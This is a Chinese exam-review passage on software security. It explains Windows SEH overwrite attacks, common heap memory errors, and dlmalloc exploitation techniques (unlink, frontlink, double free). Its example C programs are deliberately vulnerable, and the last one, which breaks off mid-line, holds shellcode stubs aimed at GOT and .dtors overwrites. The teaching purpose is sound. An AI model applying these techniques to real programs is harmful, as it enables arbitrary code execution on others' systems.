<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2051.png" alt="image.png"></p>
<p>2.SEH处理流程</p>
<p>（1）SEH结构体<strong>存放在系统栈中</strong>。当<strong>线程初始化</strong>时会自动向<strong>栈</strong>中<strong>安装一个SEH</strong>，作为<strong>线程默认的异常处理。</strong></p>
<p>（2）如果程序源代码中使用了_try{}_except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中<strong>安装一个SEH来实现异常处理。</strong></p>
<p>（3）栈中一般<strong>会同时存在多个SEH。</strong>栈中的多个SEH通过<strong>链表指针</strong>在栈内<strong>由栈顶向栈底串成单向链表</strong>，位于链表<strong>最顶端</strong>的SEH通过<strong>TEB(线程环境块)0字节偏移处的指针标识。</strong></p>
<p>（4）当异常发生时，<strong>操作系统会中断程序</strong>，并首先从TEB的0字节偏移处取出<strong>距离栈顶最近的SEH</strong>，使用<strong>异常处理函数句柄</strong>所指向的代码来处理异常。</p>
<p>（5）当离事故现场最近的异常处理函数运行失败时，将顺着SEH链表<strong>依次尝试其他的异常处理函数。</strong></p>
<p>（6）如果程序安装的所有异常处理函数都不能处理，系统将采用<strong>默认的异常处理函数</strong>。通常这个函数会弹出一个对话框，然后<strong>强制关闭</strong>程序。</p>
<p>3.SEH攻击</p>
<p><strong>思路：将异常处理函数的指针，替换成shellcode的指针</strong>。SafeSEH和SEHOP，微软的新seh，无法被利用了。</p>
<p>（1）SEH存放在<strong>栈内</strong>，我们可以<strong>精心制造出溢出数据</strong>来<strong>把SEH的异常处理的函数地址替换为shellcode的起始地址。</strong></p>
<p>（2）溢出后<strong>错误的栈帧或堆块数据</strong>往往会触发异常，我们能查到<strong>哪些能触发异常的片段。</strong></p>
<p>（3）当Windows开始处理溢出后的异常时<strong>会调用shellcode</strong>，它会<strong>把shellcode当作异常函数来处理</strong>异常。</p>
<p>4.SEH代码事例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=<span class="string">&quot;\x90\x90…&quot;</span>;</span><br><span class="line"><span class="comment">// 由于我们要得到shellcode起始位置，SEH地址等信息，所以我们先用0x90来进行填充</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;got an exception,press Enter to kill process!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">// 这是我们自己编写的异常处理函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* input)</span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">_asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//int 3指令**可以中断进程开始调试**</span></span><br><span class="line">_try&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf,input);<span class="comment">// 产生栈溢出。</span></span><br><span class="line">zero=<span class="number">4</span>/zero;<span class="comment">// 除0产生异常</span></span><br><span class="line">&#125;</span><br><span class="line">_except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>（1）函数test中存在典型的栈溢出漏洞。</p>
<p>（2）_try{}会在test的函数栈帧中<strong>安装一个SEH结构。</strong></p>
<p>（3）_try中的<strong>除0操作</strong>会<strong>产生一个异常</strong></p>
<p>（4）当strcpy操作没有产生溢出时，除0操作的异常将最终被MyExceptionHandler函数处理。</p>
<p>（5）当strcpy操作<strong>产生溢出</strong>，并精确地将栈帧中的<strong>SEH异常处理句柄修改为shellcode的入口地址时，</strong>操作系统将会错误地使用shellcode去处理除0异常，代码植入成功。</p>
<p>（6）此外，异常处理机制会检测进程是否处于调试状态。如果直接用调试器加载程序，异常处理会进入调试状态下的处理流程。因此<strong>我们在代码中加入断点_asm int 3</strong>，让进程中断，然后<strong>用调试器attach的方法进行调试。</strong></p>
<p><em>（考过选择题，没有<strong>SEH</strong>啊）5.Windows内存安全机制概述：*<em>GS编译、DEP、Heap cookie、Safe Unlink、ASLR</em></em></p>
<h2 id="动态内存安全"><a href="#动态内存安全" class="headerlink" title="动态内存安全"></a>动态内存安全</h2><h3 id="动态内存管理概述"><a href="#动态内存管理概述" class="headerlink" title="动态内存管理概述"></a>动态内存管理概述</h3><p>1.动态内存管理函数（知道每个函数作用）</p>
<p>（1）C标准定义的内存分配函数：calloc()、malloc()、realloc()。</p>
<p>（2）使用free()函数释放内存，C++使用<strong>new表达式</strong>分配内存，使用<strong>delete表达式</strong>释放内存。</p>
<p>（3）malloc(size_t size)：<strong>分配size个字节，</strong>并返回一个<strong>指向分配的内存的指针。</strong>分配的内存<strong>未被初始化为一个已知值</strong>。</p>
<p>（4）free(void * p)：<strong>释放由p指向的内存空间</strong>，这个p必须是先前通过调用malloc()，calloc()，或者realloc()返回的。<strong>如果free(p)此前已经被调用过，将会导致未定义行为；如果p是空指针，则不执行任何操作。</strong></p>
<p>（5）realloc(void <em>p, size_t size)：<strong>将p所指向的内存块的大小改为size个字节。</strong>新大小和旧大小中较小的值那部分内存所包含的内容不变。<strong>新分配的内存未做初始化。</strong>如果<strong>p是空指针，</strong>则该调用<strong>等价于malloc(size)。</strong>如果size等于0，则该调用*<em>等价于free(p)。如果p不是空指针，则其必须是早先调用malloc()，calloc()，或者realloc()所返回的结果。</em></em></p>
<p>（6）calloc(size_t nmemb, size_t size)：为数组分配内存，<strong>该数组共有nmemb个元素，每个元素的大小为size个字节，</strong>并返回一个<strong>指向所分配的内存的指针</strong>。<strong>所分配的内存的内容全部被设置为0。</strong></p>
<p>2.内存管理器</p>
<p>（1）既管理<strong>已分配的内存，</strong>也管理<strong>已释放的内存。</strong>作为<strong>客户进程的一部分运行。</strong></p>
<p>（2）内存分配的不同算法</p>
<p>①<strong>连续匹配方法</strong>。查询匹配的<strong>第一个空闲块（从当前开始）</strong></p>
<p>②<strong>最先</strong>匹配。从<strong>内存开始位置</strong>寻找第一个空闲块。</p>
<p>③<strong>最佳</strong>匹配。选择大小满足要求（&gt;&#x3D;），且最小的块。（恰好）   </p>
<p>④最优匹配：对空闲块取样，选取第一个比样本更合适的块，返回最优结婚策略。</p>
<p>⑤最差匹配：挑最大的空闲块</p>
<p>⑥伙伴系统方法：以前的方法可能导致片段化；伙伴系统<strong>只分配$2^i$大小的块</strong>；倘若<strong>需要m</strong>大小的块，<strong>分配$2^{[\log_b m]}+1$<strong>大小；当块返回时，</strong>尝试和它相邻的同样大小的块合并。</strong></p>
<p>⑦<strong>隔离</strong>。保持<strong>单独的大小一致的块</strong>的列表。一直都是2、4、6的大小的块。   </p>
<p>（3）<strong>返回已释放的块到池中，合并临近空闲块为更大的块，有时使用压缩的预留块，</strong>把所有块移到一起。</p>
<h3 id="常见的内存管理错误"><a href="#常见的内存管理错误" class="headerlink" title="常见的内存管理错误"></a>常见的内存管理错误</h3><p><strong>（考过）初始化错误、未检查返回值、引用已释放内存、对同一块内存释放多次、不正确配对的内存管理函数（new对delete才对）、未能区分标量和数组、分配函数使用不当（比如malloc(0)）。</strong></p>
<p>1.初始化错误</p>
<p>（1）程序员假设<strong>malloc()把分配的内存的所有位初始化为零</strong></p>
<p>（2）初始化<strong>大</strong>的内存块<strong>可能会降低性能</strong>并且<strong>不总是必要的</strong>：<strong>程序员必须用memset()或通过调用calloc()初始化内存，它们都将内存清零</strong></p>
<p>考试练习题（解答题，看看）：该段代码存在什么错误？如何修复？</p>
<p>（1）int *y &#x3D; malloc(n * sizeof(int))：<strong>分配的内存包含随机值</strong>，y[i]<strong>没有被初始化为0</strong>。<strong>需要调用calloc()将内存清零。</strong></p>
<p>（2）没有检查内存分配是否成功，函数返回局部变量的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* return y = Ax */</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">matvec</span><span class="params">(<span class="type">int</span> **A, <span class="type">int</span> *x, <span class="type">int</span> n)</span> &#123; </span><br><span class="line"><span class="type">int</span> *y = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">y[i] += A[i][j] * x[j];</span><br><span class="line"><span class="comment">// y[i]初始化为零, 对么?</span></span><br><span class="line"><span class="comment">/* 第7行的赋值语句假定y[i]初始化为0，用memset()或通过调用calloc()初始化内存 */</span></span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.未检查返回值</p>
<p>（1）内存是<strong>有限的资源</strong>，它可能会被耗尽。</p>
<p>（2）内存分配函数报告调用者状态：VirtualAlloc()返回NULL、(MFC)new表达式抛出CMemoryException<em>、HeapAlloc()可能返回NULL或者产生结构化异常。应用程序应该：*<em>决定什么时候错误发生，以合适方式处理异常。</em></em></p>
<p>（3）<strong>如果不能分配请求的空间，那么malloc()函数返回一个空指针。</strong>在不能分配内存时，有个<strong>一致的恢复计划</strong>是需要的。</p>
<p>（4）PhkMalloc：提供了一个X选项，在启用主选项的情况下，当分配失败时，内存分配器会向标准错误输出设备打印一段诊断信息并调用abort()，而不是返回错误状态值。</p>
<p>（5）如果没有内存可分配的话，<strong>malloc返回空指针。</strong>C++中的<strong>new表达式抛出bad_alloc异常</strong>：使用new，将分配封装在try块中。</p>
<ul>
<li>检查malloc返回值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *i_ptr;</span><br><span class="line">i_ptr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*nelements_wanted);</span><br><span class="line"><span class="keyword">if</span> (i_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">i_ptr[i] = i;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Couldn&#x27;t get the memory - recover */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>new表达式异常处理</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"> <span class="type">int</span> *pn = new <span class="type">int</span>;</span><br><span class="line"> <span class="type">int</span> *pi = new <span class="type">int</span>(<span class="number">5</span>); </span><br><span class="line"> <span class="type">double</span> *pd = new <span class="type">double</span>(<span class="number">55.9</span>); </span><br><span class="line"> <span class="type">int</span> *buf = new <span class="type">int</span>[<span class="number">10</span>]; </span><br><span class="line"> . . .</span><br><span class="line">&#125;</span><br><span class="line">catch (bad_alloc) &#123;</span><br><span class="line"> <span class="comment">// handle failure from new</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>不合语法！</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *pn = new <span class="type">int</span>;</span><br><span class="line"><span class="keyword">if</span> (pn) &#123; … &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; … &#125;</span><br><span class="line"><span class="comment">// 如果条件总是真的话，不管内存分配成功与否</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用像malloc的新方法的nothrow变种</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *pn = new(nothrow) <span class="type">int</span>;</span><br><span class="line"><span class="keyword">if</span> (pn) &#123; … &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; … &#125;</span><br></pre></td></tr></table></figure>

<p>3.引用已释放内存</p>
<p>（1）几乎总能成功，因为释放的内存是被<strong>内存管理器</strong>回收的</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/2e047133-7af7-4164-a90c-8d2194f98066.png" alt="image.png"></p>
<p>（2）不可能导致运行时错误：<strong>因为内存由内存管理器所有。</strong></p>
<p>（3）<strong>已释放的内存在读操作之前可被分配</strong>：读操作读取的数值不正确，写操作损坏其他变量。</p>
<p>（4）<strong>已释放内存能被内存管理器使用：</strong>写操作能损坏内存管理器元数据，很难诊断运行时错误，<strong>漏洞利用的基础。</strong></p>
<p>4.多次释放内存</p>
<p>（1）经常是剪切和粘贴错误</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="comment">/* manipulate x */</span></span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"></span><br><span class="line">y = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="comment">/* manipulate y */</span></span><br><span class="line"><span class="built_in">free</span>(x);</span><br></pre></td></tr></table></figure>

<p>（2）数据结构包含指向同一项的链接</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2052.png" alt="image.png"></p>
<p>（3）错误处理：结果是<strong>内存块被释放</strong>，但在正常处理过程中再次被释放。一般来说<strong>内存泄露比双重释放更安全。</strong></p>
<p>5.不正确配对的内存管理函数</p>
<p>（1）总是使用：<strong>new←→delete、malloc←→free</strong></p>
<p>（2）有时不恰当的配对在某些平台仍能工作，但是代码是<strong>不可移植的。</strong></p>
<p>6.未能区分标量和数组：C++对于标量和数组有不同的表达式。<strong>new←→delete标量、new[]←→delete[]数组。</strong></p>
<p>7.分配函数的不当使用</p>
<p>（1）malloc(0)，即分配0字节：<strong>能导致内存管理错误，</strong>C运行时库能返回<strong>空指针和伪地址</strong>。最安全和便捷的解决方案是<strong>确保没有零长度分配。</strong></p>
<p><strong>（2）使用alloca()</strong></p>
<p>①功能：在调用者的栈中分配内存，<strong>在调用alloca()的函数返回时自动释放该内存</strong></p>
<p>②问题：通常实现为内联函数，不返回空的错误，分配空间时超出栈边界。</p>
<h3 id="dlmalloc"><a href="#dlmalloc" class="headerlink" title="dlmalloc"></a>dlmalloc</h3><p>1.dlmalloc管理内存块：<strong>空闲、分配。内存块要么被分配给进程，要么空闲。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2053.png" alt="image.png"></p>
<p>2.<strong>Dlmalloc空闲块</strong>管理</p>
<p>（1）<strong>以双链表形式组织起来</strong>，包含<strong>指向下一块的前向指针</strong>和<strong>指向上一块的后向指针</strong>，<strong>最后4字节存有该块的大小。</strong></p>
<p>（2）已分配块和空闲块都使用<strong>一个PREV_INUSE位区分</strong>：<strong>块大小总是偶数，PREV_INUSE位被存储于块大小的低位中。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2054.png" alt="image.png"></p>
<p>（3）空闲块被组织成<strong>筐</strong>，<strong>由头索引，筐中的块大约同样大小，</strong>还有一个包含<strong>最近释放的块</strong>的筐做为<strong>缓存</strong>。</p>
<p>（4）空闲块合并时：<strong>相邻空闲块，合并</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2055.png" alt="image.png"></p>
<p>3.解链技术：Unlink宏（记一下步骤）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123; </span></span><br><span class="line">FD = P -&gt; fd; </span><br><span class="line">BK = P -&gt; bk; </span><br><span class="line">FD -&gt; bk = BK; </span><br><span class="line">BK -&gt; fd = FD; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2056.png" alt="image.png"></p>
<p>unlink是一种<strong>攻击</strong>技术。利用缓冲区溢出来操作内存块的<strong>边界标志</strong>。用来攻击dlmalloc，覆盖先前的<strong>PREV_INUSE</strong>字段。可以<strong>任意写4字节数据</strong>。</p>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> *first, *second, *third;</span><br><span class="line">first = <span class="built_in">malloc</span>(<span class="number">666</span>); <span class="comment">// 内存分配块 1</span></span><br><span class="line">second = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">// 内存分配块 2</span></span><br><span class="line">third = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">// 内存分配块 3</span></span><br><span class="line"><span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">free</span>(first); </span><br><span class="line"><span class="built_in">free</span>(second); </span><br><span class="line"><span class="built_in">free</span>(third); </span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>对于strcpy(first, argv[1])：程序接受单个字符串参数并将其复制到first中，无界strcpy()操作容易引发<strong>缓冲区溢出。</strong></li>
<li>程序调用free()<strong>释放第一块内存。</strong></li>
<li>如果第二块内存处于待分配状态（即空闲），free()操作<strong>将会试图将其与第一块合并。</strong></li>
<li>为了判断第二块内存是否处于空闲状态,free()会<strong>检查第3块的PREV_INUSE标志位。</strong></li>
<li>参数会覆写第二块内存中表示<strong>上一块内存大小的域、块大小值以及前向指针和后向指针</strong>，从而也就修改了free()操作的行为。</li>
<li>第二块内存的大小域的值被修改为-4，因此当free()需要确定第三块内存的位置时，也就是说<strong>将第二块内存的起始位置加上其大小时会导致将其起始位置减4。</strong>Doug Lea的malloc此时会错误地认为下一连续内存块<strong>自第二块内存前面4字节起。</strong></li>
<li>这个恶意参数也会使dlmalloc所找到的PREV_INUSE<strong>标志位为空</strong>，从而dlmalloc误以为<strong>第二块内存是未分配的</strong>，导致free()调用<strong>unlink()宏</strong>来合并这两块内存。</li>
</ul>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2057.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2058.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2059.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2060.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2061.png" alt="image.png"></p>
<p>（3）unlink()宏<strong>将攻击者提供的4个字节的数据写到同样是由攻击者指定的4个字节的地址处。</strong></p>
<p>①一旦攻击者<strong>可以在任意地址处写入4字节数据</strong>，利用该漏洞程序本身的权限执行任意代码就变得简单多了。</p>
<p>②攻击者可能会<strong>提供栈中指令指针的地址</strong>，然后<strong>利用unlink()宏将该地址覆写为恶意代码的地址。</strong></p>
<p>③将漏洞程序调用的函数的地址<strong>替换为恶意代码的地址</strong>。</p>
<p>④攻击者可以检查程序的可执行映像，找到free()函数的调用跳槽（jump slot）地址：address-12处的值包含在恶意参数中，因此unlink()宏会将free()库函数调用地址覆写为shellcode的地址。每当程序调用free()时都会转而执行shellcode。</p>
<p>（4）对堆缓冲区溢出的利用并不是特别困难的事情：该利用方式最困难之处在于<strong>精确地确定第一块内存的大小</strong>，以便<strong>计算出需要覆写的第二块内存的地址。</strong>攻击者可以从dlmalloc中复制request2size(req,nb)宏的代码到其利用代码中，然后使用这个宏计算出块的大小。</p>
<p>4.Frontlink技术</p>
<p>（1）和unlink相比较，frontlink技术更难以应用但也很危险：当一块内存被释放时，<strong>它必须被正确地链接进双链表中</strong>。在dlmalloc的某些版本中，此项操作是由frontlink()代码段完成的。我们的目标是在<strong>攻击者指定的地址写入攻击者指定的数据。</strong></p>
<p>（2）实现：攻击者<strong>指定一个内存块的地址而不是shellcode的地址，在这个内存块的起始4个字节中放入可执行代码。</strong>通过<strong>往上一内存块的最后4个字节中写入指令</strong>实现的。</p>
<p>（3）练习题</p>
<p>攻击者提供恶意实参：包含一段shellcode，<strong>该shellcode的最后4个字节就是跳转到shellcode其他部分的跳转指令，</strong>并且这4个字节<strong>是first块的最后4个字节。</strong>为了确保该条件能够满足，<strong>被攻击的内存块必须是8的整数倍减去4个字节长。</strong></p>
<p>C语言代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123; <span class="keyword">if</span> (argc !=<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: prog_name arg1 \n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *first, *second, *third;</span><br><span class="line"><span class="type">char</span> *fourth, *fifth, *sixth;</span><br><span class="line">first = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>);</span><br><span class="line">second = <span class="built_in">malloc</span>(<span class="number">1500</span>);</span><br><span class="line">third = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">fourth = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">fifth = <span class="built_in">malloc</span>(<span class="number">1508</span>);</span><br><span class="line">sixth = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(first, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">free</span>(fifth); </span><br><span class="line"><span class="built_in">strcpy</span>(fourth, argv[<span class="number">1</span>]); </span><br><span class="line"><span class="built_in">free</span>(second);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>strcpy(first, argv[2])：将argv[2]复制到first块</li>
<li>free(fifth)：当fifth内存块被释放时，它被放入<strong>一个筐中（1508）</strong></li>
<li>strcpy(fourth, argv[1])：其直接前驱内存块fourth被精心设计的数据所<strong>填满（argv[1]）</strong>，因此这里就发生了溢出。并且fifth的前向指针指向了一个<strong>假的内存块。</strong>这个假的内存块的后向指针的位置包含有<strong>一个函数指针的地址（假的内存+12，也就是后向）</strong>：一个合适的<strong>函数指针</strong>是存储于程序.dtors区中的第一个析构函数的地址。攻击者可以通过<strong>检查可执行映像</strong>而获得这个地址，一般就是前面指针讲到过的。</li>
<li>free(second)：当second块被释放时，程序使frontlink()代码段将其插入到与<strong>fifth块</strong>相同的筐中。</li>
<li>return(0)：对return(0)的调用，本来应该导致程序的<strong>析构函数被调用</strong>，而现在<strong>实际调用的却是shellcode。</strong></li>
</ul>
<p>frontlink代码片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BK = bin;</span><br><span class="line">FD = BK-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (FD != BK) &#123;</span><br><span class="line"><span class="keyword">while</span> (FD != BK &amp;&amp; S &lt; chunksize(FD)) &#123; </span><br><span class="line">FD = FD-&gt;fd; </span><br><span class="line">&#125;</span><br><span class="line">BK = FD-&gt;bk;</span><br><span class="line">&#125;</span><br><span class="line">P-&gt;bk = BK;</span><br><span class="line">P-&gt;fd = FD;</span><br><span class="line">FD-&gt;bk = BK-&gt;fd = P</span><br></pre></td></tr></table></figure>

<ul>
<li>while (FD !&#x3D; BK &amp;&amp; S &lt; chunksize(FD)) ：<strong>second比fifth内存块小</strong>，frontlink()代码段中的while循环得以执行。</li>
<li>FD &#x3D; FD-&gt;fd：fifth块的前向指针被存储到FD中，<strong>这是一个假地址，</strong>他的后向，也就是+12的地方是类似.dtors函数位置。</li>
<li>BK &#x3D; FD-&gt;bk：<strong>找到的FD是假地址</strong>（比如.dtors中指针的前12个字节），而此处循环的BK原本应该就是第5块的，但是这里做了精心处理，变成了包含函数地址（此处是.dtors相关）的一个地址了。此处用second来覆盖.dtors地址，而second为first覆盖，指向的是first中的shellcode。前向的后向指向second，这样就替换了假地址的后向，也就是改变了.dtors的值。</li>
<li>FD-&gt;bk &#x3D; BK-&gt;fd &#x3D; P：现在BK包含有函数指针的地址（指针值减8），函数指针<strong>被second块的地址所覆写。</strong></li>
<li>当frontlink()执行完毕后，second块的前向指针和后向指针都分别指向<strong>函数指针。</strong></li>
</ul>
<p>6.双重释放漏洞（考了n次）</p>
<p>（1）这种类型的漏洞是由于对同一块内存释放两次所造成的<strong>（在这两次释放之间没有对内存进行重新分配，</strong>被释放的内存块相邻的内存块必须<strong>已分配）</strong><br>（2）要成功地利用双重释放漏洞，有两个条件必须满足：<strong>被释放的内存块必须在内存中独立存在、该内存所被放入的筐（bin）必须为空。</strong></p>
<p>（3）一个空的筐和一个已分配的内存块：空的筐<strong>仅仅包含头</strong>，筐和内存块之间没有任何联系。</p>
<p>（4）块被释放后，它被放入筐中：在调用frontlink后，筐的前向和后向指针指向已释放的块</p>
<p>（5）对内存块的第二次释放毁坏了筐结构：frontlink</p>
<p>（6）该漏洞可被利用的进一步说明：技术是困难的，<strong>已释放的内存没有立即放入筐中</strong>，而是被缓存。双重释放块可能和其他块合并。</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *GOT_LOCATION = (<span class="type">char</span> *)<span class="number">0x0804c98c</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xeb\x0cjump12chars_&quot;</span> <span class="comment">/* jump */</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main(<span class="type">void</span>)&#123;</span><br><span class="line"><span class="type">int</span> size = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line"><span class="type">void</span> *shellcode_location;</span><br><span class="line"><span class="type">void</span> *first, *second, *third, *fourth;</span><br><span class="line"><span class="type">void</span> *fifth, *sixth, *seventh;</span><br><span class="line">shellcode_location = (<span class="type">void</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">strcpy</span>(shellcode_location, shellcode);</span><br><span class="line">first = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>); </span><br><span class="line">second = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">third = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">fourth = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>); </span><br><span class="line"><span class="built_in">free</span>(first); </span><br><span class="line"><span class="built_in">free</span>(third); </span><br><span class="line">fifth = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">128</span>); </span><br><span class="line"><span class="built_in">free</span>(first);</span><br><span class="line">sixth = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">*((<span class="type">void</span> **)(sixth+<span class="number">0</span>))=(<span class="type">void</span> *)(GOT_LOCATION<span 